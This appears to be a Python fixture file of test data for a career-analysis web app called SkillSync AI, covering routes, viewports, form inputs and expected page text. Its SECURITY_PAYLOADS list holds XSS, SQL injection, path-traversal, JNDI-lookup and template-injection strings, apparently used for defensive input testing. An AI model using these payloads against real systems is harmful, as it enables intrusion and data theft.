PUBLIC_ROUTES = [
    ("/", "SkillSync AI"),
    ("/analysis", "Start your career analysis"),
    ("/login", "Welcome back"),
    ("/signup", "Create your account"),
    ("/forgot-password", "Reset your password"),
    ("/pricing", "Simple pricing"),
    ("/results", "Your career matches are ready"),
]

VIEWPORTS = [
    (390, 844),
    (768, 1024),
    (1024, 768),
    (1366, 768),
    (1440, 1000),
]

FIELD_SKILL_CASES = [
    ("Engineering & Technology", "Python"),
    ("Engineering & Technology", "Java"),
    ("Engineering & Technology", "React"),
    ("Engineering & Technology", "SQL"),
    ("Medical & Health Sciences", "Patient Assessment"),
    ("Medical & Health Sciences", "Pharmacology"),
    ("Business & Commerce", "Financial Analysis"),
    ("Business & Commerce", "Digital Marketing"),
    ("Arts, Design & Media", "UI/UX Design"),
    ("Arts, Design & Media", "Content Writing"),
    ("Science & Research", "Physics"),
    ("Science & Research", "Research Methodology"),
    ("Law & Social Sciences", "Contract Law"),
    ("Law & Social Sciences", "Public Speaking"),
]

AUTH_INPUTS = [
    ("login", "/login", "input[type='email']", "student@example.com"),
    ("login", "/login", "input[type='password']", "Passw0rd!"),
    ("signup", "/signup", "input[type='text']", "Student User"),
    ("signup", "/signup", "input[type='email']", "new.student@example.com"),
    ("signup", "/signup", "input[type='password']", "Passw0rd!"),
    ("forgot", "/forgot-password", "input[type='email']", "student@example.com"),
]

SECURITY_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "' OR '1'='1",
    "../../etc/passwd",
    "${jndi:ldap://example.com/a}",
    "<svg onload=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

TEXT_EXPECTATIONS = [
    ("/", "AI-powered career intelligence"),
    ("/", "Career Analysis"),
    ("/analysis", "Select your field of study"),
    ("/analysis", "Upload resume"),
    ("/login", "Continue with Google"),
    ("/login", "Forgot password?"),
    ("/signup", "Free forever"),
    ("/forgot-password", "Send OTP"),
    ("/pricing", "Free"),
    ("/pricing", "Pro"),
    ("/results", "Log in to see your results"),
]


def repeat_to_count(source, count):
    return [source[index % len(source)] + (index,) for index in range(count)]
